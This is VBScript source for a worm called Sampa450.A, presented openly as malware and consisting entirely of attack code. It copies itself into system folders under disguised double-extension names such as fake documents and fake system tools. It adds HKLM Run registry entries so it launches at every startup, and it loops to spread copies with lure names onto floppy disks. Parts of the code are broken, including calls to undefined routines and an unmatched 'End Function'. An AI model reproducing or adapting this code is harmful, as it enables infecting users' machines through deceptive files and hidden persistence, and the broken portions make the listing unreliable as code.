'= Sampa450.A 
'= by MulekeArt ... 100% Brasil
On Error Resume Next
Dim Corrente
Dim Paulista
RADIO = 0
POLICIA = 0
Randomize timer
RUA = Int(Rnd * 3)
MARCO()
Favela()
Transito()
Set Sp = CreateObject("Scripting.FileSystemObject")
Set MARCO = Sp.GetSpecialFolder(0)
Set tristeza = Sp.GetFile(WScript.ScriptFullName)
tristeza.Copy (MARCO&"\Historia_De_Sao_Paulo.doc.doc.vbe")
tristeza.Copy (MARCO&"\Sp450.vbs")
ZonaLeste()
Set ZonaL = Sp.GetSpecialFolder(1)
tristeza.Copy (ZonaL&"\ZonaL.vbe")
ZonaOeste()
Set ZonaO = Sp.GetSpecialFolder("C:\")
tristeza.Copy (ZonaO&"\ZonaO.vbe")
ZonaSul()
Set ZonaS = Sp.GetSpecialFolder(2)
tristeza.Copy (ZonaS&"\ZonaS.vbe")
ZonaNorte()
tristeza.Copy (MARCO&"\ZonaN.vbs")
tristeza.Copy (MARCO&"\Msconfig.exe.vbs")
tristeza.Copy (MARCO&"\VSheild.exe.vbs")
tristeza.Copy (ZonaL&"\Command.com.vbs")
Favela()
Set Corrente = CreateObject("WScript.Shell")
Corrente.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry",MARCO&"\VSheild.exe.vbs"
Corrente.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SaoPaulo",MARCO&"\Historia_De_Sao_Paulo.doc.doc.vbe"
Corrente.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SysTray",ZonaL&"\Command.com.vbs"
Transito()
Do
POLICIA = POLICIA + 1
RADIO = RADIO + 1
If RUA = 0 Then ESCOLA = "Readme.txt.txt.vbs"
If RUA = 1 Then ESCOLA = "IMPORTANT.txt.txt.vbs"
If RUA = 2 Then ESCOLA = "Games.exe.exe.vbs"
If RADIO = 900000 Then
Sp.copyfile Sp.GetSpecialFolder(0)& "\Sampa450.vbs","a:\" & ESCOLA & ".tmp"
RADIO = 0
End If
Loop
End Function

